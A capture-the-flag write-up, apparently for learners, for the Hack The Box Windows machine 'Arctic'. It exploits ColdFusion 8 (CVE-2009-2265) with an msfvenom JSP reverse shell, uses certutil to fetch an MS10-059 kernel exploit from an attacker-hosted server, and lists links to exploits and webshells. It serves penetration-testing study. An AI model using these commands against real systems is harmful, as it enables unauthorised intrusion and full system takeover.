# Arctic

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Arctic)  [2](https://app.hackthebox.com/machines/Arctic)

**Machine ip:** 10.10.10.11

![Arctic](https://github.com/h4md153v63n/CTFs/assets/5091265/d397feae-2a4e-407d-b89c-8be5e16dbd0c)


# Sections
+ [Reconnaissance](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/46_Arctic.md#reconnaissance)
+ x
+ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/46_Arctic.md#links)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.11 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.11 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2a63e599-4daa-4749-9bce-3fdd108a0fb8)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1fb88333-4181-436f-afa1-c5b07366bca2)


## Enumeration
Visit **http://10.10.10.11:8500/**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2d1d0c15-3bc9-4a1e-b45f-2bbfc5ab816f)

Check consecutively **http://10.10.10.11:8500/CFIDE/** -> **http://10.10.10.11:8500/CFIDE/administrator/**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ffa0ee5-63da-4a34-802b-d94c1505c0b2)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dc394261-f2e2-4ff1-8097-2bff1c424d5e)


## Exploitation & Gaining Access

### Method 1: [CVE-2009-2265](https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py) - Arbitrary File Upload
`searchsploit ColdFusion 8.0`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8ebb9589-7dde-449e-b246-753a5516da14)

Without metasploit, download the exploit: [CVE-2009-2265](https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/249d5d95-b6cf-4463-b08a-c0a89556408d)

Generate a **jsp** reverse shell payload with msfvenom:

```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.24 lport=4444 -f raw -o payload.jsp
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8a065239-c0c4-444b-b822-4fbb82ec1195)

Execute the exploit: `python2 upload.py 10.10.10.11 8500 payload.jsp`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/14c69e8e-c227-4fd2-8387-c2d648fb6979)

Start netcat listener: `nc -lnvp 4444`

Visit the payload on the browser: `http://10.10.10.11:8500/userfiles/file/exploit.jsp`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4742bb0b-33c5-4a3a-bcb9-7d4e30059efa)

Get the revershell, and read the user.txt flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c7c29511-3e4a-44e2-a455-cbb6fde1a4a6)

**Alternatively**, check on Exploit Analysis **[1]**(https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#path-1-unauthenticated-rce) **[2]**(https://juggernaut-sec.com/hackthebox-arctic/#Exploiting_CVE-2009-2265_%E2%80%93_Arbitrary_File_Upload)


### Method 2: [CVE-2010-2861](https://www.exploit-db.com/exploits/14641) - Directory Traversal / Password Hash Leak / Upload JSP
Check the solution on [1](https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#path-2-leak-hash-upload-jsp) [2](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/arctic-writeup-w-o-metasploit#id-33df)

**Alternatively**, **firstly**, check on crackstation.net [1](https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#path-2-leak-hash-upload-jsp) [2](https://juggernaut-sec.com/hackthebox-arctic/#Exploiting_CVE-2009-2265_–_Arbitrary_File_Upload) to view cracked leaked password hash.


## Privilege Escalation

### Method 1: MS10-059 / Kernel Exploit
Run `systeminfo` command:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eff27157-eea5-4e03-9f32-e6c80e696f91)

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/595ca8c8-d4f9-4097-8f8d-6269df2958be)

Run Windows Exploit Suggester:

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-23-mssb.xls --systeminfo systeminfo.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1890f685-15db-47dd-9b54-395cc6ddfef8)

Download exploit **MS10-059** [1](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059), and transfer to the target victim, then prepare netcat listener, and run it:

```
# On the kali attack vm:
sudo python3 -m http.server

nc -lnvp 5555


# On the target machine:
certutil.exe -urlcache -split -f "http://10.10.14.24:8000/MS10-059.exe" MS10-059.exe

MS10-059.exe 10.10.14.24 5555
```

Get the shell as **nt authority\system**, and read root.txt flag:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03b09a37-ec6e-4c65-8fdf-f1a0fc7ae8d8)


### Method 2: Juicy Potato
+ Check the solution on **Juicy Potato** [1](https://juggernaut-sec.com/hackthebox-arctic/#Elevating_Privileges_to_SYSTEM_–_Method_1_Juicy_Potato)
+ Check for [more details](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/46_Arctic.md#juicy-potato---rotten-potato) 


---

# Links

# References & Alternatives
+ https://vvmlist.github.io/#Arctic
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/arctic-writeup-w-o-metasploit
  + https://0xdf.gitlab.io/2020/05/19/htb-arctic.html
  + https://cyberkareem.medium.com/hackthebox-arctic-walkthrough-13e1920d0cca
+ https://juggernaut-sec.com/hackthebox-arctic/


## CVE Scripting
+ **CVE-2009-2265 / Arbitrary File Upload:**
  + https://github.com/c0d3cr4f73r/CVE-2009-2265
    + https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py
    + https://raw.githubusercontent.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit/main/exploit.py
  + https://www.exploit-db.com/exploits/16788
  + https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/
    + https://www.exploit-db.com/exploits/50057
+ **CVE-2010-2861 / Directory Traversal Vulnerability:**
  + https://www.exploit-db.com/exploits/14641
  + https://www.rapid7.com/db/modules/auxiliary/scanner/http/coldfusion_locale_traversal/
  + https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+ **MS10-059 / Kernel Exploit:**
  + https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
    + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
  + https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled


## Tools
+ **Windows Exploit Suggester:**
  + https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+ **Windows Exploit Suggester 2:**
  + https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2
+ **WES-NG:**
  + https://github.com/bitsadmin/wesng
+ **crackstation.net:** https://crackstation.net
+ **CFM webshell:** https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm
+ **PowerUp:**
  + https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 
+ **accesschk64.exe:**
  + https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite


## Technical Knowledge
+ https://www.speedguide.net/port.php?port=8500
+ https://github.com/SecWiki/windows-kernel-exploits
  + https://juggernaut-sec.com/kernel-exploits-part-1/
  + https://juggernaut-sec.com/kernel-exploits-part-2/
+ https://juggernaut-sec.com/hackthebox-arctic/#Local_Enumeration_Using_Manual_Techniques_and_PowerUpps1
  + https://juggernaut-sec.com/weak-service-file-permissions/
  + https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/
  + https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite


## Problems Solution
+ -


## Juicy Potato - Rotten Potato
+ https://juggernaut-sec.com/seimpersonateprivilege/
+ https://github.com/ivanitlearning/Juicy-Potato-x86
	+ https://github.com/ivanitlearning/Juicy-Potato-x86/releases
	+ https://github.com/ohpe/juicy-potato/releases
	+ https://github.com/ohpe/juicy-potato/
+ **CLSID:**
	+ https://ohpe.it/juicy-potato/CLSID/
	+ https://github.com/ohpe/juicy-potato/tree/master/CLSID
+ https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
	+ https://ohpe.it/juicy-potato/
	+ https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/
	+ https://rizemon.github.io/posts/devel-htb/
	+ https://yogeshwarram-g.gitbook.io/hackthebox/windows/devil#privilege-escalation


## For More
+ https://nets.ec/Coldfusion_hacking#Logging_In
+ https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File

